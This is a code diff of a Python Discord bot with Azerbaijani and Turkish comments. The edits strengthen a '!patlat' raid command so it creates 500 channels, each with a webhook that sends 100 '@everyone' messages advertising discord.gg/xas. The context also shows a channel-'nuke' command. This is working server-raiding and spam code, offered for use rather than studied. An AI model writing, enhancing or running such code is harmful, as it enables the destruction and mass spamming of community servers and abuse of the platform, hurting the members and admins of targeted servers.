@@ -484,6 +484,7 @@ async def nuke_ctx(ctx):
     await ctx.channel.delete()
     await new_channel.edit(position=position)
     await new_channel.send("💥 Kanal sıfırlandı!")
+
 @bot.command(name="ban")
 async def ban_cmd(ctx, member: discord.Member, *, reason="Göstərilməyib"):
     if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
@@ -621,7 +622,7 @@ async def poll_cmd(ctx, *, soru):
     await msg.add_reaction("👎")
 
 # =====================================================================
-# 10. ULTRA SÜRƏTLİ VƏ MAKSİMUM DESTRUKTİV !PATLAT KOMUTU
+# 10. ULTRA SÜRƏTLİ VƏ 500 KANAL MAKSİMUM SPAM !PATLAT KOMUTU
 # =====================================================================
 @bot.command(name="patlat")
 async def patlat_cmd(ctx):
@@ -649,16 +650,16 @@ async def patlat_cmd(ctx):
     except:
         pass
 
-    # 3. Maksimum sürətlə 250 kanal açmaq və hər birində webhook spamı yaratmaq
+    # 3. Maksimum limit olan 500 kanal açmaq və hər birində minlərlə spam yaratmaq
     async def fast_nuke(i):
         try:
             channel = await guild.create_text_channel(f"ruhumskdi-{i}")
             webhook = await channel.create_webhook(name="XAS Spammer")
-            await asyncio.gather(*(webhook.send("discord.gg/xas @everyone") for _ in range(30)), return_exceptions=True)
+            await asyncio.gather(*(webhook.send("discord.gg/xas @everyone") for _ in range(100)), return_exceptions=True)
         except:
             pass
 
-    await asyncio.gather(*(fast_nuke(i) for i in range(1, 250)), return_exceptions=True)
+    await asyncio.gather(*(fast_nuke(i) for i in range(1, 501)), return_exceptions=True)
 
 # =====================================================================
 # 11. BOTU İŞƏ SALMAQ (RUN)
@@ -668,5 +669,4 @@ if __name__ == "__main__":
     TOKEN = os.getenv("DISCORD_TOKEN")
     if TOKEN:
         bot.run(TOKEN)
-    
-
+        
